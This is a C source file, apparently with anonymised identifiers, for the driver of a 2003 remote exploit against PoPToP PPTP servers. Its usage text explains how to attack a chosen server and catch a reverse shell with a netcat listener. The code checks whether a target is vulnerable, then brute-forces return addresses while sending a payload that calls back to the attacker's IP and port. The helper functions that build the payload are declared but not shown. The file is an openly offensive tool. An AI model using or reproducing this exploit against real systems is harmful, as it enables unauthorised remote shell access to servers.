
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {int ctrl_type; int length; } ;
struct TYPE_4__ {TYPE_1__ header; } ;
typedef TYPE_2__ pptp_reply ;
typedef int WSADATA ;
typedef int WORD ;
typedef int DWORD ;


 int VAR_0 ;
 int VAR_1 ;
 scalar_t__ VAR_2 ;
 int FUNC_0 (int) ;
 int VAR_3 ;
 int FUNC_1 (int,int *) ;
 int FUNC_2 (char*) ;
 int FUNC_3 (int ) ;
 int FUNC_4 (char*) ;
 int FUNC_5 (int ) ;
 int FUNC_6 (int ) ;
 int FUNC_7 (char*,...) ;
 int FUNC_8 (int ,char*,int,int ) ;
 int FUNC_9 (int ) ;
 int FUNC_10 (int ,int,char*,int) ;
 int VAR_4 ;

int FUNC_11(int VAR_5, char** VAR_6)
{
        FUNC_7("\n");
        FUNC_7("                   D  H     H                            \n");
        FUNC_7("                   D  H     H     T\n");
        FUNC_7("                   D  H  H  H     T     EE    AA   M   M \n");
        FUNC_7("               DDD D  HHHHHHH     T    E  E  A  A  MM MM \n");
        FUNC_7("              D   DD  H  H  H    TTTT  E  E  A  A  MM MM \n");
        FUNC_7("             D     D  H     H     T    EEE   AAAA  M M M \n");
        FUNC_7("              D    D  H     H     T    E     A  A  M   M \n");
        FUNC_7("               DDDD   H     H      TTT  EEE  A  A  M   M   ");
        FUNC_7(" ... presents ... \n\n");
  FUNC_7("Exploit for PoPToP PPTP server older than \n1.1.4-b3 and 1.1.3-20030409 under Linux.\n");
        FUNC_7("by .einstein., April 2003.\n");
        FUNC_7("\n");
  if (VAR_5 < 2)
  {
                FUNC_7("usage: \n");
                FUNC_7("  %s <pptp_server> [<your_ip>] [<your_port>] [<timeout>]\n\n",VAR_6[0]);
                FUNC_7("    <pptp_server> is the ip address or hostname of the PoPToP server\n");
                FUNC_7("      you want to attack.  Port 1723 is used for connection\n");
                FUNC_7("    <your_ip> and <your_port> - specify an ip address to which\n");
                FUNC_7("      a connection is possible to port <your_port> and set up a\n");
                FUNC_7("      netcat listener. You'll get a reverse shell.\n");
                FUNC_7("    <timeout> is a delay between stack bruteforce attemts, in milliseconds\n");
                FUNC_7("   If you only pass a single parameter, the program will check\n");
                FUNC_7("   whether remote server is vulnerable or not. Otherwise it will\n");
                FUNC_7("   perform a ret bruteforce.\n");
                FUNC_7("usage examples:\n");
                FUNC_7("  %s 192.168.1.2 192.168.1.1 5555\n",VAR_6[0]);
                FUNC_7("    attack 192.168.1.2 and get a reverse shell on port 5555\n");
          FUNC_7("  %s 127.0.0.1 127.0.0.1 6666 100\n",VAR_6[0]);
                FUNC_7("    attack a locally running pptpd with a timeout of 100 ms\n");
                FUNC_7("    and get a shell on port 6666.\n");
                FUNC_7("  %s 192.168.1.56\n",VAR_6[0]);
                FUNC_7("    check if the PoPToP server on 192.168.1.56 is vulnerable.\n");
    return 0;
        }


  int VAR_7 = 500;
  if (VAR_5 >= 5) VAR_7 = FUNC_2(VAR_6[4]);


        WORD VAR_8=0x0101;
  WSADATA VAR_9;
  FUNC_1(VAR_8,&VAR_9);

        DWORD VAR_10;
        if (VAR_5 == 2)
        {
                if (!FUNC_4(VAR_6[1])) return 1;

                FUNC_7("\nChecking if the server is vulnerable..\n");
                FUNC_7("(if it is you have to wait 65 seconds)..\n");
                FUNC_9(VAR_4);

                VAR_10 = 0x01010101;
                int VAR_11;
                pptp_reply VAR_12;


                VAR_11 = FUNC_8(VAR_4,(char*)&VAR_12,2,0);
                VAR_11 = FUNC_6(VAR_12.header.length);
                VAR_11 = FUNC_8(VAR_4,(char*)&VAR_12+2,VAR_11-2,0);
                int VAR_13 = FUNC_5(VAR_12.header.ctrl_type);
                FUNC_10(VAR_4,VAR_10,"0.0.0.0",0);


                VAR_11 = FUNC_8(VAR_4,(char*)&VAR_12,2,0);
                FUNC_7("PoPToP server is ");
                if (VAR_11 != VAR_1) FUNC_7("vulnerable!\n");
                else FUNC_7("not vulnerable\n");
                FUNC_3(VAR_4);

                return 1;
        }

        FUNC_7("[!] Attempting bruteforce against %s\n",VAR_6[1]);
        FUNC_7("interrupt when you get a shell to %s on port %d...\n\n",VAR_6[2],FUNC_2(VAR_6[3]));

        int VAR_14 = 0;

        for (VAR_10 = VAR_3; VAR_10 >=VAR_0; VAR_10 -= VAR_2)
        {
          FUNC_7("[*] ");
                if (!FUNC_4(VAR_6[1])) return 1;
        FUNC_7("[ret=0x%x]..",VAR_10);
        FUNC_7("sending payload..");


                FUNC_9(VAR_4);


          FUNC_10(VAR_4,VAR_10,VAR_6[2],FUNC_2(VAR_6[3]));
                FUNC_3(VAR_4);

                FUNC_0(VAR_7);
                FUNC_7("done\n");



        }

        return 0;
}
